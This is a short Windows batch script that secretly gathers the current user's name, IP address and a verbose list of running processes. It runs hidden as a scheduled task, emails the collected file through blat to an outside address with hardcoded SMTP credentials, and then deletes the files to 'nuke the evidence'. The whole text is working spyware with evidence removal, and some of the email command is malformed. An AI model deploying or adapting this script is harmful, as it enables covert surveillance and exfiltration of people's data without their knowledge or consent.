REM This script will write a user's name, IP address amd a list of running processes to a file
REM This information is compiled and then e-mailed to a specified address
REM This script is designed to be run as a scheduled task and in the background without opening a window    

REM Get the user's name
for /f "tokens=2 delims=," %%a in ('wmic computersystem get username /format:csv') do set uname=%%a

REM Get the user's IP address
for /f "tokens=2 delims=[]" %%a in ('ping %computername% -4 -n 1 ^| findstr "["') do set ip=%%a

REM Get a list of running processes
tasklist /v /fi "username eq %uname%" /fo csv > %temp%\tasklist.csv

REM Write the information to a file
echo %uname%,%ip% > %temp%\info.txt
type %temp%\tasklist.csv >> %temp%\info.txt

REM Send the file as an e-mail
blat -body <Message> -u SMTPSIMPMASTER -pw SIMP_PASSWORD_123 -to processfarmer@abyssmail.com -f  sadsimp@gmail.com -charset utf-8 -s "ProcessList"  -server smtp.gmail.com -port 587  -attacht %temp%\info.txt


REM Nuke the evidence
del %temp%\info.txt
del %temp%\tasklist.csv

